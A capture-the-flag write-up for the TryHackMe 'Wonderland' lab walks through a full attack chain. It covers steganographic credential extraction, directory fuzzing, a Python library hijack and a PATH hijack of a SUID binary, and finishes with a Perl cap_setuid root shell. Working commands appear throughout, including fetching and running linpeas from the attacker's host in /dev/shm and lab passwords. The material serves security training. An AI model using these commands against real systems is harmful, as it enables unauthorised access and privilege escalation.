# TryHackMe — Wonderland Write-up

> *"We're all mad here."* — The Cheshire Cat

**Difficulty:** Medium
**Category:** Linux, Steganography, Privilege Escalation
**Platform:** TryHackMe

---

## Overview

Wonderland is a beautifully themed CTF room on TryHackMe that takes you on a trip down the rabbit hole — literally. The path from initial access to root involves steganography, directory fuzzing, Python library hijacking, binary PATH manipulation, and Linux capabilities abuse. Every step has a clever Alice in Wonderland twist to it, which makes the whole experience genuinely fun. Let's get into it.

---

## Step 1 — Following the White Rabbit (Steganography)

The first hint is right there on the website — an image of a white rabbit. If a CTF puts an image in your face early on, there's a good chance something is hiding inside it. I reached for `steghide` to extract any embedded data:

```bash
steghide extract -sf white_rabbit.jpg
```

This dropped a file called `hint.txt`. Opening it revealed:

```
follow the r a b b i t
```

Simple enough. But what does that actually mean? That's where the web enumeration comes in.

---

## Step 2 — Down the Rabbit Hole (Directory Enumeration)

I ran `gobuster` against the web server to map out the directory structure:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
```

This gave me a `/r/` directory to start with. Taking the hint literally — `r a b b i t` — I began fuzzing each nested level. Under `/r/` there was an `/a/`, and following the pattern all the way down led to a full path:

```
/r/a/b/b/i/t/
```

Navigating to that final subdirectory revealed an image of Alice. Things are getting curiouser and curiouser.

---

## Step 3 — Through the Looking Glass (SSH Credentials)

Alice's image was also a candidate for steganography, but this time `steghide` needed a passphrase. Instead of brute-forcing it, I inspected the page source of `/r/a/b/b/i/t/` and found the passphrase sitting right there in the HTML — a classic hiding-in-plain-sight move.

Running steghide on Alice's image with that passphrase extracted a set of SSH credentials:

```
alice : HowDothTheLittleCrocodileImproveHisShiningTail
```

A quick SSH login confirmed access:

```bash
ssh alice@<target-ip>
```

We're in. Time to look around.

---

## Step 4 — alice → rabbit (Python Library Hijacking)

The first thing I always do after landing on a box is check what the current user can run with elevated privileges:

```bash
sudo -l
```

The output showed something interesting:

```
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

So alice can run that specific Python script as the `rabbit` user. I opened the script and noticed it `import random` at the top — and that's the opening we need.

Python's import system checks the current directory before looking at system-wide libraries. So if I create a file named `random.py` in the same directory as the script, Python will load mine instead of the real one.

I created `/home/alice/random.py` with the following:

```python
import pty
pty.spawn('/bin/bash')
```

Then ran the script as the `rabbit` user:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The terminal dropped me straight into a bash shell as `rabbit`. Library hijacking is one of those techniques that feels almost too simple when it works.

---

## Step 5 — rabbit → hatter (Binary PATH Manipulation)

Moving into `/home/rabbit`, I found a SUID binary called `teaParty`. Running it gave:

```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Sat, 13 Jun 2026 10:20:50 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped)
```

I pulled the binary to my local machine using a quick Python HTTP server:

```bash
# On the target
python3 -m http.server 8080

# On my machine
wget http://<target-ip>:8080/teaParty
```

Running `strings` on the binary showed it was calling `date` — the system date command — without using an absolute path. That's a PATH hijacking vulnerability.

I created a fake `date` binary in `/tmp`:

```bash
echo '#!/bin/sh' > /tmp/date
echo 'whoami' >> /tmp/date
chmod +x /tmp/date
```

Then prepended `/tmp` to the PATH and ran `teaParty` again:

```bash
export PATH=/tmp:$PATH
/home/rabbit/teaParty
```

The `whoami` output came back as `hatter`. The binary was running as hatter all along. From there it was straightforward to update the fake `date` script to read hatter's password file:

```bash
echo '#!/bin/sh' > /tmp/date
echo 'cat /home/hatter/password.txt' >> /tmp/date
```

Running `teaParty` again revealed:

```
WhyIsARavenLikeAWritingDesk?
```

Logging in as hatter via SSH confirmed the password was correct.

---

## Step 6 — hatter → root (Linux Capabilities)

With a proper shell as hatter, I uploaded `linpeas.sh` to the target and ran it from `/dev/shm` (tmpfs, so it doesn't leave traces on disk):

```bash
# On my machine
python3 -m http.server 80

# On target
cd /dev/shm
wget http://<my-ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS flagged something right away — `perl` had the `cap_setuid` capability set:

```
/usr/bin/perl = cap_setuid+ep
```

Linux capabilities are a way of granting specific root-level privileges to binaries without making them full SUID. `cap_setuid` allows a process to change its UID — meaning we can set it to 0 (root). GTFOBins has the exact one-liner for this:

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Running that dropped me into a root shell.

---

## Step 7 — Capturing the Flags

With root access, it was time to collect the flags. Wonderland has a fun twist here — the flags are in unexpected places:

**user.txt** is in `/root/`, not the user's home directory:

```bash
cat /root/user.txt
```

**root.txt** is in `/home/alice/`:

```bash
cat /home/alice/root.txt
```

A nice little nod to the upside-down nature of Wonderland itself.

---

## Key Takeaways

This room does a great job of chaining together a variety of real-world techniques without any single step feeling contrived. A few things worth remembering from this one:

**Steganography** is still used in CTFs (and occasionally in the wild) to hide data inside innocent-looking files. `steghide` is a go-to tool, and page source inspection can yield passphrases.

**Python library hijacking** works because Python resolves imports relative to the script's directory first. When a script running with elevated privileges imports a common module, creating a malicious file with the same name in a writable directory gives you code execution in that privilege context.

**PATH manipulation** is a classic that never gets old. Any SUID or sudo-allowed binary calling system commands without absolute paths is potentially vulnerable. Always run `strings` on unknown binaries and look for unqualified command calls.

**Linux capabilities** are worth checking during any privilege escalation. They're less obvious than SUID bits and often overlooked in hardening checklists. `cap_setuid` on an interpreted language runtime like Perl is essentially a root shell waiting to happen.

---

*Room: [Wonderland on TryHackMe](https://tryhackme.com/room/wonderland)*
